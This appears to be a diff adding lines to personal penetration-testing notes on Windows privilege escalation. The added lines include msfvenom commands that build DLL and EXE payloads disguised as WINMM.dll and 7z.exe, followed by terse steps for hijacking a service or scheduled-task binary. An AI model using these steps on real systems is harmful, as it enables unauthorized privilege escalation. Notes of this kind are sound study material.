@@ -199,3 +199,22 @@ find / -type f -perm /2000 -ls 2>/dev/null
 
 https://gtfobins.github.io
 
+
+
+
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\\users\\demoadmin\\Desktop\\whoami.txt' -f dll > WINMM.dll 
+process name is 
+path contains dll 
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\\users\\demoadmin\\Desktop\\whoami.txt' -f exe > 7z.exe 
+
+
+check running services  (for dlls check schedualed tasks for funky dlls) 
+sort by description 
+find bad guy file 
+check directory to make sure u can edit 
+copy file 
+create msfvenom payload 
+
+
+
+
